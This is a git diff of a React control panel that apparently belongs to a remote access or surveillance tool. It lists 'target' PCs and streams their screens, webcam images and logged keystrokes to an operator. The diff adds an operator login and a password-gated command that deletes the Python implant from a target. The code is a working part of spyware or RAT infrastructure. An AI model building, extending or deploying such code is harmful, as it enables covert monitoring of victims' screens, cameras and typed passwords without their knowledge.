@@ -1,5 +1,6 @@
 import { useEffect, useState, useRef } from "react";
 import { io } from "socket.io-client";
+import LoginForm from "./Login";
 
 // Ensure this matches your server URL
 const socket = io(process.env.NODE_ENV == "development" ? "http://localhost:3000" : "/");
@@ -10,6 +11,7 @@ export default function App() {
     const [selectedPcId, setSelectedPcId] = useState(null);
     const [screen, setScreen] = useState(null);
     const [camera, setCamera] = useState(null);
+    const [isLogged, setIsLogged] = useState(false);
     const [keyinputs, setKeyinputs] = useState("");
     const [inputText, setInputText] = useState("");
     const [socketConnected, setSocketConnected] = useState(false);
@@ -22,15 +24,21 @@ export default function App() {
     useEffect(() => {
         // Receive the list of PCs
         socket.on("connect", () => setSocketConnected(true));
-        socket.on("disconnect", () => setSocketConnected(false));
+        socket.on("disconnect", () => {
+            setSocketConnected(false);
+            setIsLogged(false);
+        });
+        socket.on("logged", (data) => {
+            setIsLogged(data);
+        });
         socket.on("update_pc_list", (list) => {
-            console.log("Updated PC List:", list);
+            // console.log("Updated PC List:", list);
             setPcList(list);
         });
 
         // Receive Image Data
         socket.on("screen", (d) => setScreen("data:image/jpeg;base64," + d));
-        socket.on("camera", (d) => setCamera(d?"data:image/jpeg;base64," + d:null));
+        socket.on("camera", (d) => setCamera(d ? "data:image/jpeg;base64," + d : null));
         socket.on("keyinput", (d) => {
             setKeyinputs(prev => prev + d);
             if (textareaRef.current) {
@@ -42,6 +50,7 @@ export default function App() {
         return () => {
             socket.off("connect");
             socket.off("disconnect");
+            socket.off("logged");
             socket.off("update_pc_list");
             socket.off("screen");
             socket.off("camera");
@@ -87,10 +96,15 @@ export default function App() {
 
     const delete_file = () => {
         if (!selectedPcId) return;
-        if (confirm("Are you sure to delete python file from system.")) {
-            socket.emit("delete_file", {
-                targetId: selectedPcId
-            });
+        if (confirm("Are you sure to delete python file from target system.")) {
+            const password = prompt("Enter password");
+            if (password && confirm("You'll get lost from the access from the target.")) {
+                socket.emit("delete_file", {
+                    targetId: selectedPcId,
+                    password
+                });
+                setSelectedPcId(null);
+            }
         }
     };
 
@@ -116,34 +130,49 @@ export default function App() {
 
     // --- Render ---
 
+    // 0. login first
+
+
+    const handleLogin = (e, { username, password }) => {
+        e.preventDefault();
+        if (socket.connected) {
+            socket.emit("login", { username, password })
+        }
+
+    };
+
+    if (!isLogged) {
+        return !socketConnected ? "Connecting..." : <LoginForm handleSubmit={handleLogin} />
+    }
+
     // 1. PC List View
     if (!selectedPcId) {
         return (
             !socketConnected
                 ? "Connecting..." : <div style={{ padding: 20, background: "#111", minHeight: "100vh", color: "white", fontFamily: "sans-serif" }}>
-                <h2>Available PCs</h2>
-                <div style={{ display: "flex", gap: 15, flexWrap: "wrap" }}>
-                    {pcList.length === 0 && <p style={{ color: "#888" }}>No PCs online...</p>}
-                    {pcList.map((pc) => (
-                        <div
-                            key={pc.id}
-                            onClick={() => handleSelectPc(pc.id)}
-                            style={{
-                                border: "1px solid #444",
-                                background: "#222",
-                                padding: "20px",
-                                borderRadius: "8px",
-                                cursor: "pointer",
-                                width: "200px",
-                                textAlign: "center"
-                            }}
-                        >
-                            <h3 style={{ margin: "0 0 10px 0" }}>{pc.name}</h3>
-                            <small style={{ color: "#666" }}>{pc.id.slice(0, 6)}...</small>
-                        </div>
-                    ))}
+                    <h2>Available PCs</h2>
+                    <div style={{ display: "flex", gap: 15, flexWrap: "wrap" }}>
+                        {pcList.length === 0 && <p style={{ color: "#888" }}>No PCs online...</p>}
+                        {pcList.map((pc) => (
+                            <div
+                                key={pc.id}
+                                onClick={() => handleSelectPc(pc.id)}
+                                style={{
+                                    border: "1px solid #444",
+                                    background: "#222",
+                                    padding: "20px",
+                                    borderRadius: "8px",
+                                    cursor: "pointer",
+                                    width: "200px",
+                                    textAlign: "center"
+                                }}
+                            >
+                                <h3 style={{ margin: "0 0 10px 0" }}>{pc.name}</h3>
+                                <small style={{ color: "#666" }}>{pc.id.slice(0, 6)}...</small>
+                            </div>
+                        ))}
+                    </div>
                 </div>
-            </div>
         );
     }
 
@@ -156,7 +185,7 @@ export default function App() {
                 {/* Toolbar */}
                 <div style={{ padding: 10, background: "#333", display: "flex", gap: 10 }}>
                     <button onClick={() => {
-                        if(socket.connected){
+                        if (socket.connected) {
                             socket.emit("stop", { targetId: selectedPcId })
                         }
                         setSelectedPcId(null);
